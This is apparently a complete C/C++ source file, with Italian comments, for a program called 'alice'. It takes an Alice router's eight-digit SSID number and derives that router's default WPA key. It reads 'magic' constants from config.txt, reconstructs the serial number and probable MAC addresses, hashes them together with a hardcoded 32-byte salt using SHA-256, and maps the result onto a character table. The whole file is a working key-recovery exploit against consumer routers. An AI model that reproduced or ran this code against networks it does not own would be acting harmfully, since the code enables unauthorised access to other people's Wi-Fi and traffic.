#include "sha2.h"
#include "functions.hpp"

#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

using namespace std;

/*
	TODO
	* Standard per le definizioni/allocazioni delle stringhe
	* Config file
		* Voci con la X - DONE - da testare
		* Voci multiple - DONE -
		* Upper-lower case - sanitize
	* Tentativi con le reti adiacenti - DONE - 
	* Tentativi MAC OUI? - indipendenza da magic[4] - magic[4] == XXXXXX
	* Controllo se tutto va come deve andare in eseguzione
	* Testare sempre serie adiacenti - da decidere
	* Mostrare probabilità
	* Duplicati!
	
	- vedi foglio -
	http://www.wifi-shark.co.cc/forum/showthread.php?tid=75
*/

int ReadConfig(unsigned int ** &db, const char * path) {
    FILE * cFile;
    char buffer[100];
    char * pch;
    char * magic;
    
    unsigned int count = 0;

    unsigned int ** more_db;

    cFile = fopen(path, "r");
    if (cFile == NULL) {
        fputs("Error opening file\n", stderr);
        exit(3);
    } else {
        while (fgets(buffer, 100, cFile)) {
            pch = strchr(buffer, ';');
            if (pch==NULL) continue;
            *pch = '\0';
            
            pch = strchr(buffer, '"');
            if (pch==NULL) continue;
            magic = pch+1;
            
            pch = strchr(magic, '"');
            if (pch==NULL) continue;
            *pch = '\0';
            
            //puts(magic);
            
            if (count == 0) {
                db = (unsigned int **) malloc((count+1) * sizeof(intptr_t));
            } else {
                more_db = (unsigned int**) realloc (db, (count+1) * sizeof(intptr_t));
                if (more_db!=NULL) {
                    db=more_db;
                } else {
                    free(db);
                    fputs("Error (re)allocating memory\n", stderr);
                    exit(4);
                }
            }
            
            db[count] = (unsigned int *)malloc(sizeof(int)*5);
            
            pch = strtok(magic, ",");
            for (unsigned int i = 0; i<5; i++)
            {
                if (i == 4) db[count][i] = strtoul(pch, NULL, 16);
                else db[count][i] = strtoul(pch, NULL, 10);
                pch = strtok(NULL, ",");
            }
            
            count++;
        }
        fclose(cFile);
    
        return count;
    }
}

unsigned int TrovaMagic(unsigned int ** &db, unsigned int count, unsigned int serie, 
                        unsigned int ** &magic, bool adiacente) {
    unsigned int trovati = 0;
    unsigned int ** more_magic;
    for (unsigned short i = 0; i<count; i++) {
        if (db[i][0] == serie || db[i][0] == serie/10 || // se non adiacente
            abs(db[i][0] - serie) < 2 || // consideriamo sempre le confinanti (da verificare)
            (adiacente && (
            abs(db[i][0] - serie/10) < 2 || abs(db[i][0] - serie) < 10 // se adiacente
            )) ) {
            if (trovati == 0) {
                magic = (unsigned int **) malloc((trovati+1) * sizeof(intptr_t));
            } else {
                more_magic = (unsigned int **) realloc (magic, (trovati+1) * sizeof(intptr_t));
                if (more_magic!=NULL) {
                    magic=more_magic;
                } else {
                    free(magic);
                    fputs("Error (re)allocating memory\n", stderr);
                    exit(4);
                }
            }
            
            magic[trovati] = db[i];
            trovati++;
        }
    }
    return trovati;
}

int main(int argc, char* argv[])
{
    if (argc != 2) {
        fputs("Uso: alice SSIDnumber\n", stderr);
        return 1;
    }
    if (strlen(argv[1]) != 8) {
        fputs("Uso: alice SSIDnumber\n", stderr);
        fputs("L'SSIDnumber è un numero di otto cifre.\n", stderr);
        return 1;
    }
    int ssid = strtoul(argv[1], NULL, 10);
    
    unsigned int ** db;
    int count = ReadConfig(db, "config.txt");
    
    fprintf(stderr, "Lette %i voci da config.txt\n", count);
    
    fprintf(stderr, "Serie della rete: %i\n", ssid/100000);
    
    bool adiacenti = false;
    unsigned int ** magic_list;
    unsigned int num_magic = TrovaMagic(db, count, ssid/100000, magic_list, false);
    
    if (num_magic == 0) {
        fprintf(stderr, "Magic non presente nel database: provo le reti adiacenti\n");
        adiacenti = true;
        num_magic = TrovaMagic(db, count, ssid/100000, magic_list, true);
    }
    
    unsigned char ALIS[32] = {
      0x64,0xC6,0xDD,0xE3,0xE5,0x79,0xB6,
      0xD9,0x86,0x96,0x8D,0x34,0x45,0xD2,
      0x3B,0x15,0xCA,0xAF,0x12,0x84,0x02,
      0xAC,0x56,0x00,0x05,0xCE,0x20,0x75,
      0x91,0x3F,0xDC,0xE8
    };
    unsigned char preInitCharset[] = {
      '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j',
      'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3',
      '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
      'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7',
      '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r',
      's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b',
      'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
      'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f',
      'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
      '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j',
      'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3',
      '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
      'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3'
    };
    
    unsigned char mac[7];
    unsigned char digest[33];
    unsigned char wpa[25];
    unsigned char sn[14];
    SHA256_CTX * ctx = new SHA256_CTX;
    char SN[14];
    unsigned int * magic;
    unsigned int mac_possibili[3];
    unsigned short a = 0;
    while (a < num_magic) {
        magic = magic_list[a];    
        a++;
        
        unsigned int serie = magic[0];
        unsigned int sn1 = magic[1];
        unsigned int k = magic[2];
        unsigned int q = magic[3];
        unsigned int mac_prob = magic[4];
        
        if (adiacenti) fprintf(stderr, "### Serie adiacente: %i\n", serie);
        fprintf(stderr, "## Magic: %i, %i, %i, %06x\n", sn1, k, q, mac_prob);
        
        // mac_possibili[0]/0x1000000%0x10, mac_possibili[1]/0x1000000%0x10, mac_possibili[2]/0x1000000%0x10
        
        for (short i = 0; i<3; i++) {
            mac_possibili[i] = ssid + ( i * 100000000 );
        }
        
        // fprintf(stderr, "Mac possibili in base al padding: %x, %x, %x\n", mac_possibili[0], mac_possibili[1], mac_possibili[2]); // Più debug che altro
        
        char * mac_probabili[3] = { NULL, NULL, NULL };
        for (short i = 0; i<3; i++) {
            if (mac_possibili[i]/0x1000000%0x10 == mac_prob%0x10) {
                mac_probabili[i] = (char*)malloc(sizeof(char)*13);
                sprintf(mac_probabili[i], "%06x%06x", mac_prob, mac_possibili[i]%0x1000000);
                ToUpper(mac_probabili[i]);
            }
        }
        
        if ((ssid-q) % k != 0 || (ssid-q)/k > 9999999) {
            fprintf(stderr, "## Magic inadatti\n");
            continue;
        }
        sprintf((char *)sn, "%05iX%07i", sn1, (ssid-q)/k);
        fprintf(stderr, "## SN: %s\n", sn);
        
        for (short i = 0; i<3; i++) { // Testare se ce n'è + di uno TODO
            if (mac_probabili[i] == NULL) continue;
            fprintf(stderr, "# Mac probabile: %s\n", mac_probabili[i]);
            HexSequenceToChar(mac_probabili[i], mac, 6);
            
            strncpy(SN, (char *)sn, 13);
            
            SHA256_Init(ctx);
            SHA256_Update(ctx, ALIS, 32);
            SHA256_Update(ctx, (unsigned char *)SN, 13);
            SHA256_Update(ctx, mac, 6);
            SHA256_Final(digest, ctx);
            
            for (short x = 0; x<24; x++) {
                wpa[x] = preInitCharset[digest[x]];
            }
            wpa[24] = '\0';
            
            puts((char *)wpa);
        }
    }
    
    return 0;
}
